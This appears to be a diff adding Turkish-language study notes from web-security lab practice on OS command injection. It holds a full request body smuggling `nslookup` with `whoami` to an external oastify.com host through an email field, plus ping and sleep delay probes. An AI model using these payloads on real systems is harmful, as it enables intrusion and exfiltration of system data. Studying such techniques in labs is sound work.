@@ -18,3 +18,12 @@ simdi ayni sekilde bu sefer parolaya ayni saldiriyi gerceklestiriyoruz.
 saldiri bittiginde gordugumuz deger gercek degerdir.
 
 _______________________________________________________________
+
+### OS Command Injection 
+```Javascript
+csrf=rNED41GCvbP8vgtXfK1rs4BGsTvbe11F&name=testerererere&email=tipybu%40cyclelove.cc||nslookup+`whoami`.oyqhkljtvxhzosoxlu4m9qtg87ey2n.oastify.com+#||&subject=testre&message=testssssss
+```
+Burada tirnak isareti farkli bunu unutma.
+eng klavyede tab in usutndeki olacak whoami
+bunun disinda `||ping+-c+10+127.0.0.1+||` bu 10 saniye falan bekletiyor guzel test. ama son lab da bekletmiyordu mesela. sadece su yukaridaki nslookup ve burp collabrator yaptigim kisimda tek bu yontem ise yaradi....
+Ekstra olarak ping yerine `sleep 10` komutum da ise yaradi/
